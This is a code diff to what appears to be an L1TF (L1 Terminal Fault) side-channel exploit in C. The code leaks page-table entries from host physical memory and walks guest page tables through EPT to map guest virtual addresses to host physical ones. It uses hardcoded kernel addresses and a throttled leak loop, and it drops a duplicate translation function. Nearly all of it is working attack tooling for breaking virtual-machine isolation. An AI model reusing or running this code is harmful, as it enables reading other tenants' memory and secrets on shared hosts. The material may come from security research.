@@ -21,6 +21,7 @@ hpa_t gadget_base(void)
 void leak(void *data, hpa_t base, hpa_t pa, int len)
 {
 	leak_attempts += len;
+	usleep(200000);
         l1tf_leak(data, base, pa, len);
 }
 
@@ -238,10 +239,23 @@ retry_pte:
 	return pa;
 }
 
-/* Translate a guest virtual address via Two Dimensional Paging into a host
- * physical adddress.
+static void pfx_set(char **pfx, char *prefix, const char *prefmt, const char *fmt, ...)
+{
+	if (prefmt) {
+		int off = snprintf(*pfx, 0x100, "%s", prefix);
+		va_list args;
+		va_start(args, fmt);
+		off += vsnprintf(*pfx+off, 0x100-off, fmt, args);
+		va_end(args);
+	}
+	else
+		*pfx = NULL;
+}
+
+/* Translate a guest virtual address via Two Dimensional Paging into a guest or
+ * host physical adddress.
  */
-hpa_t translate_tdp(hpa_t base, gva_t va, gva_t gdm, hpa_t gcr3, hpa_t eptp)
+pa_t translate_tdp(hpa_t base, gva_t va, gva_t gdm, hpa_t gcr3, hpa_t eptp, int out_gpa, const char *prefmt, ...)
 {
 	if (va == 0xffffffffb9611f80+G_TASK_COMM) {
 		fprintf(stderr, "HARDCODED TRANSLATION LOOKASIDE: gva %lx --> hpa %lx\n", va, 0x4552e12b00);
@@ -255,6 +269,16 @@ hpa_t translate_tdp(hpa_t base, gva_t va, gva_t gdm, hpa_t gcr3, hpa_t eptp)
 		fprintf(stderr, "HARDCODED TRANSLATION LOOKASIDE: gva %lx --> hpa %lx\n", va, 0x2b2c41bac0);
 		return 0x2b2c41b8c0;
 	}
+
+	va_list args;
+	char prefix[0x100];
+	char pfxbuf[0x100];
+	char *pfx;
+	if (prefmt) {
+		va_start(args, prefmt);
+		vsnprintf(prefix, sizeof(prefix), prefmt, args);
+		va_end(args);
+	}
 	
 	fprintf(stderr, "translate_tdp(%lx)", va);
 	const int verbose = 1;
@@ -262,10 +286,12 @@ hpa_t translate_tdp(hpa_t base, gva_t va, gva_t gdm, hpa_t gcr3, hpa_t eptp)
 	u64 tries_gpgd = 0, tries_gpud = 0, tries_gpmd = 0, tries_gpte = 0;
 
 	if (gdm && in_direct_map(va, gdm)) {
-		if (verbose >= 1)
-			return translate(base, va-gdm, eptp, 0, "gva %lx --{gdm}--> gpa %lx ", va, va-gdm);
-		else
-			return translate(base, va-gdm, eptp, 0, NULL);
+		pfx = pfxbuf; pfx_set(&pfx, prefix, prefmt, "\\--> gpa %lx", va-gdm);
+		if (out_gpa) {
+			if (pfx) pr_dub("%s\n", pfx);
+			return va-gdm;
+		}
+		return translate(base, va-gdm, eptp, 0, pfx);
 	}
 
 	hpa_t gpgd_pa = gcr3 + 8 * BITS(va, 48, 39);
@@ -281,7 +307,8 @@ retry_gpgd:
 	if (verbose >= 2) dump(gpgd);
 	if ((gpgd & 0xfff) != 0x067)
 		goto retry_gpgd;
-	pte_t pgd = translate(base, gpgd, eptp, 0, "    \\--> \\ gpgd %10lx", gpgd);
+	pfx = pfxbuf; pfx_set(&pfx, prefix, prefmt, "\\--> \\ gpgd %10lx", gpgd);
+	pte_t pgd = translate(base, gpgd, eptp, 0, pfx);
 	if (verbose >= 2) dump(pgd);
 	if (pgd == -1ULL)
 		goto retry_gpgd;
@@ -307,13 +334,19 @@ retry_gpud:
 	if (IS_HUGE(gpud)) {
 		gpa_t gpa = (gpud & BITS_MASK(52, 30)) | BITS(va, 30, 0);
 		if (verbose >= 2) dump(gpa);
-		hpa_t hpa = translate(base, gpa, eptp, 0, "          \\ gpud %10lx", gpud);
+		pfx = pfxbuf; pfx_set(&pfx, prefix, prefmt, "      \\ gpud %10lx", gpud);
+		if (out_gpa) {
+			if (pfx) pr_dub("%s\n", pfx);
+			return gpa;
+		}
+		hpa_t hpa = translate(base, gpa, eptp, 0, pfx);
 		if (verbose >= 2) dump(hpa);
 		if (hpa == -1ULL)
 			goto retry_gpud;
 		return hpa;
 	}
-	pte_t pud = translate(base, gpud, eptp, 0, "          \\ gpud %10lx", gpud);
+	pfx = pfxbuf; pfx_set(&pfx, prefix, prefmt, "      \\ gpud %10lx", gpud);
+	pte_t pud = translate(base, gpud, eptp, 0, pfx);
 	if (verbose >= 2) dump(pud);
 	if (pud == -1ULL)
 		goto retry_gpud;
@@ -339,13 +372,19 @@ retry_gpmd:
 	if (IS_HUGE(gpmd)) {
 		gpa_t gpa = (gpmd & BITS_MASK(52, 21)) | BITS(va, 21, 0);
 		if (verbose >= 2) dump(gpa);
-		hpa_t hpa = translate(base, gpa, eptp, 0, "           \\ gpmd %10lx", gpmd);
+		pfx = pfxbuf; pfx_set(&pfx, prefix, prefmt, "       \\ gpmd %10lx", gpmd);
+		if (out_gpa) {
+			if (pfx) pr_dub("%s\n", pfx);
+			return gpa;
+		}
+		hpa_t hpa = translate(base, gpa, eptp, 0, pfx);
 		if (verbose >= 2) dump(hpa);
 		if (hpa == -1ULL)
 			goto retry_gpmd;
 		return hpa;
 	}
-	pte_t pmd = translate(base, gpmd, eptp, 0, "           \\ gpmd %10lx", gpmd);
+	pfx = pfxbuf; pfx_set(&pfx, prefix, prefmt, "       \\ gpmd %10lx", gpmd);
+	pte_t pmd = translate(base, gpmd, eptp, 0, pfx);
 	if (verbose >= 2) dump(pmd);
 	if (pmd == -1ULL)
 		goto retry_gpmd;
@@ -370,133 +409,14 @@ retry_gpte:
 	}
 	gpa_t gpa = (gpte & PFN_MASK) | BITS(va, 12, 0);
 	if (verbose >= 2) dump(gpa);
-	hpa_t hpa = translate(base, gpa, eptp, 0, "            \\ gpte %10lx", gpte);
+	pfx = pfxbuf; pfx_set(&pfx, prefix, prefmt, "        \\ gpte %10lx", gpte);
+	if (out_gpa) {
+		if (pfx) pr_dub("%s\n", pfx);
+		return gpa;
+	}
+	hpa_t hpa = translate(base, gpa, eptp, 0, pfx);
 	if (verbose >= 2) dump(hpa);
 	if (hpa == -1ULL)
 		goto retry_gpte;
 	return hpa;
-}
-
-/* Translate a guest virtual address via into a guest physical adddress.
- */
-hpa_t translate2gpa(hpa_t base, gva_t va, gva_t gdm, hpa_t gcr3, hpa_t eptp)
-{
-	if (va == 0xffffffffb9611f80+G_TASK_COMM) {
-		fprintf(stderr, "HARDCODED TRANSLATION LOOKASIDE: gva %lx --> hpa %lx\n", va, 0x4552e12b00);
-		return 0x4552e12b00;
-	}
-	if (va == 0xffffffffb9612810) {
-		fprintf(stderr, "HARDCODED TRANSLATION LOOKASIDE: gva %lx --> hpa %lx\n", va, 0x4552e12810);
-		return 0x4552e12810;
-	}
-	if (va == 0xffff928b0081b8c0) {
-		fprintf(stderr, "HARDCODED TRANSLATION LOOKASIDE: gva %lx --> hpa %lx\n", va, 0x2b2c41bac0);
-		return 0x2b2c41b8c0;
-	}
-	
-	fprintf(stderr, "translate2gpa(%lx)", va);
-	const int verbose = 1;
-	if (verbose >= 2) fprintf(stderr, "translate2gpa(base=%lx, va=%lx, gdm=%lx, gcr3=%lx, eptp=%lx)\n", base, va, gdm, gcr3, eptp);
-	u64 tries_gpgd = 0, tries_gpud = 0, tries_gpmd = 0, tries_gpte = 0;
-
-	if (gdm && in_direct_map(va, gdm)) {
-		if (verbose >= 1) { fprintf(stderr, " --{gdm}--> gpa %lx ", va-gdm); fflush(stdout); }
-		return va-gdm;
-	}
-
-	hpa_t gpgd_pa = gcr3 + 8 * BITS(va, 48, 39);
-retry_gpgd:
-	if (tries_gpgd >= RETRY_THRES) {
-		if (verbose >= 2) { fprintf(stderr, "translate2gpa:"); dump(tries_gpgd); }
-		return -1;
-	}
-	tries_gpgd++;
-	if (verbose >= 2) dump(gpgd_pa);
-	pte_t gpgd = leak_pte(base, gpgd_pa);
-	if (verbose == 1) { fprintf(stderr, "\n    \\--> \\ gpgd %10lx", gpgd); fflush(stdout); }
-	if (verbose >= 2) dump(gpgd);
-	if ((gpgd & 0xfff) != 0x067)
-		goto retry_gpgd;
-	pte_t pgd = translate(base, gpgd, eptp, 0, NULL);
-	if (verbose >= 2) dump(pgd);
-	if (pgd == -1ULL)
-		goto retry_gpgd;
-
-	hpa_t l1 = pgd & PFN_MASK;
-retry_gpud:
-	if (tries_gpud >= RETRY_THRES) {
-		if (verbose >= 2) { fprintf(stderr, "translate2gpa:"); dump(tries_gpud); }
-		tries_gpud = 0;
-		goto retry_gpgd;
-	}
-	tries_gpud++;
-	if (verbose >= 2) dump(l1);
-	hpa_t pud_pa = l1 + 8 * BITS(va, 39, 30);
-	if (verbose >= 2) dump(pud_pa);
-	pte_t gpud = leak_pte(base, pud_pa);
-	if (verbose == 1) { fprintf(stderr, "          \\ gpud %10lx", gpud); fflush(stdout); }
-	if (verbose >= 2) dump(gpud);
-	if ((gpud & 0xffb) != 0x063) {
-		if (verbose == 1) fprintf(stderr, "\n");
-		goto retry_gpud;
-	}
-	if (IS_HUGE(gpud)) {
-		gpa_t gpa = (gpud & BITS_MASK(52, 30)) | BITS(va, 30, 0);
-		if (verbose >= 2) dump(gpa);
-		return gpa;
-	}
-	pte_t pud = translate(base, gpud, eptp, 0, NULL);
-	if (verbose >= 2) dump(pud);
-	if (pud == -1ULL)
-		goto retry_gpud;
-
-	hpa_t l2 = pud & PFN_MASK;
-retry_gpmd:
-	if (tries_gpmd >= RETRY_THRES) {
-		if (verbose >= 2) { fprintf(stderr, "translate2gpa:"); dump(tries_gpmd); }
-		tries_gpmd = 0;
-		goto retry_gpud;
-	}
-	tries_gpmd++;
-	if (verbose >= 2) dump(l2);
-	hpa_t pmd_pa = l2 + 8 * BITS(va, 30, 21);
-	if (verbose >= 2) dump(pmd_pa);
-	pte_t gpmd = leak_pte(base, pmd_pa);
-	if (verbose == 1) { fprintf(stderr, "           \\ gpmd %10lx", gpmd); fflush(stdout); }
-	if (verbose >= 2) dump(gpmd);
-	if ((gpmd & 0xf7b) != 0x063) {
-		if (verbose == 1) fprintf(stderr, "\n");
-		goto retry_gpmd;
-	}
-	if (IS_HUGE(gpmd)) {
-		gpa_t gpa = (gpmd & BITS_MASK(52, 21)) | BITS(va, 21, 0);
-		if (verbose >= 2) dump(gpa);
-		return gpa;
-	}
-	pte_t pmd = translate(base, gpmd, eptp, 0, NULL);
-	if (verbose >= 2) dump(pmd);
-	if (pmd == -1ULL)
-		goto retry_gpmd;
-
-	hpa_t l3 = pmd & PFN_MASK;
-retry_gpte:
-	if (tries_gpte >= RETRY_THRES) {
-		if (verbose >= 2) { fprintf(stderr, "translate2gpa:"); dump(tries_gpte); }
-		tries_gpte = 0;
-		goto retry_gpmd;
-	}
-	tries_gpte++;
-	if (verbose >= 2) dump(l3);
-	hpa_t pte_pa = l3 + 8 * BITS(va, 21, 12);
-	if (verbose >= 2) dump(pte_pa);
-	pte_t gpte = leak_pte(base, pte_pa);
-	if (verbose == 1) { fprintf(stderr, "            \\ gpte %10lx", gpte); fflush(stdout); }
-	if (verbose >= 2) dump(gpte);
-	if (!((gpte & 0xfff) == 0x063 || (gpte & 0xfff) == 0x825)) {
-		if (verbose == 1) fprintf(stderr, "\n");
-		goto retry_gpte;
-	}
-	gpa_t gpa = (gpte & PFN_MASK) | BITS(va, 12, 0);
-	if (verbose >= 2) dump(gpa);
-	return gpa;
 }
